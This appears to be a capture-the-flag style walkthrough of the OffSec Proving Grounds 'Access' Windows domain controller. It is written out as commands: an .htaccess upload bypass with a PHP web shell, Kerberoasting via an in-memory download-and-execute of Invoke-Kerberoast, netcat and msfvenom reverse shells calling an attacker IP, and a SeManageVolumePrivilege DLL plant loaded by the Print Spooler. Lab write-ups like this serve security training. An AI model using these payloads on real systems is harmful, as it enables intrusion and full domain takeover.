---
title: "PG: Access"
date: 2024-04-04
draft: false
os: "Windows"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/access/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - windows
  - active-directory
  - htaccess-upload
  - kerberoasting
  - runas
  - semanagevolumeprivilege
categories:
  - walkthrough
---

{{< box-info name="Access" os="Windows" difficulty="Medium" ip="192.168.x.x" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Apache httpd 2.4.48 (XAMPP, PHP 8.0.7)
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
389/tcp  open  ldap         AD LDAP (Domain: access.offsec)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
3268/tcp open  ldap         AD Global Catalog
5985/tcp open  http         WinRM (Microsoft HTTPAPI 2.0)
9389/tcp open  mc-nmf       .NET Message Framing (ADWS)
```
{{< /collapse >}}

This is a domain controller (Kerberos, LDAP, DNS, ADWS) that also happens to run a XAMPP/Apache stack on port 80 — the classic "web app pinned to a DC" setup, which usually means the web foothold and the AD kill chain are the same box.

### Port 80 - XAMPP Web App

Directory brute-forcing surfaces the interesting bits:

```
/assets              (200)
/cgi-bin/printenv.pl (200)  -- leaks env, but nothing exploitable
/forms               (301)
/uploads             (200)  -- writable, and there's an upload feature
```

`printenv.pl` is a dead end. The `/uploads` directory is the target: it's writable and the app lets you push files into it.

---

## Foothold

### File Upload → RCE via `.htaccess`

The upload filter blocks the obvious executable extensions but is happy to take images and **extensionless files**. EXIF-smuggled PHP (via `exiftool`) uploads fine but never runs — the handler simply won't treat those files as PHP. Anything that survives the filter isn't executed, and anything that would execute doesn't survive.

The way out is an Apache config override. Because we can drop a file with any name we like — including `.htaccess` — we upload our own directory config that registers a junk extension as PHP:

```apache
AddType application/x-httpd-php .1337
SetHandler php-script
```

Now every `.1337` file in `/uploads` is parsed as PHP. Upload a one-line command shell as `shell.1337`:

```php
<?php system($_GET['cmd']); ?>
```

Then trigger it:

```
http://access.offsec/uploads/shell.1337?cmd=whoami
```

Code execution as the Apache service account (`svc_apache`), landing in `C:\xampp\htdocs\uploads`. Drop `nc.exe` and call back for a proper shell.

---

## Privilege Escalation

### Kerberoasting the MSSQL Service Account

Enumerating local users turns up an `svc_mssql` account. On a DC, a service account is worth checking for an SPN — if it has one, it's a free Kerberoast. Confirm:

```cmd
setspn -T access.offsec -F -Q */*
```

```
CN=MSSQL,CN=Users,DC=access,DC=offsec
        MSSQLSvc/DC.access.offsec

Existing SPN found!
```

Request and export the TGS. The lazy path is `Invoke-Kerberoast` pulled straight into memory:

```powershell
iex(new-object net.webclient).downloadstring('http://192.168.45.219/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat
```

Crack the `$krb5tgs$23$` ticket offline:

```bash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

→ `svc_mssql:trustno1`

### Pivoting with RunasCs

The new creds don't grant WinRM or RDP, so there's no clean remote logon to ride. Instead, pivot in place — `RunasCs` spawns a process under `svc_mssql` from the existing `svc_apache` shell:

```powershell
Invoke-RunasCs svc_mssql trustno1 "cmd /c C:\xampp\htdocs\uploads\nc.exe -nv 192.168.45.219 1234 -e cmd.exe"
```

Catch a shell running as `svc_mssql`.

### SeManageVolumePrivilege → SYSTEM

`svc_mssql`'s token carries `SeManageVolumePrivilege`, which can be abused to gain full write access over the filesystem — including protected paths a normal user can't touch. That's enough to plant a DLL where a SYSTEM service will load it.

Use CsEnox's [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit) to unlock write access, then build a payload DLL:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=9234 -f dll -o Printconfig.dll
```

Drop it into the Print Spooler's driver directory, where the spooler's COM server will load `Printconfig.dll` for us:

```powershell
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
```

All that's left is to trigger the load (see **Proof**).

---

## Proof

Instantiating the vulnerable COM object forces the Print Spooler to load our `Printconfig.dll` under its SYSTEM context, returning a SYSTEM reverse shell:

{{< terminal title="root@access" >}}
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
{{< /terminal >}}

The callback lands as `NT AUTHORITY\SYSTEM` — full compromise of the domain controller. (SYSTEM obtained via the spooler COM load above; no `whoami`/`proof.txt` capture was recorded for this run.)

---

## Key Takeaways

{{< callout type="note" >}}
- An "images and extensionless files only" upload filter is still exploitable: uploading your own `.htaccess` with `AddType`/`SetHandler php-script` makes Apache execute any extension as PHP. Always test this when a directory is writable and accepts arbitrary filenames.
- On a domain controller, every `svc_*` account is a Kerberoast candidate — `setspn -Q */*` before reaching for anything fancier.
- Cracked creds that can't WinRM or RDP aren't dead weight. `RunasCs` pivots to that identity from a shell you already have.
- `SeManageVolumePrivilege` is a full-SYSTEM primitive: it hands you write access to protected paths, which turns into a DLL plant loaded by a SYSTEM service (here, the Print Spooler via a COM CLSID).
{{< /callout >}}
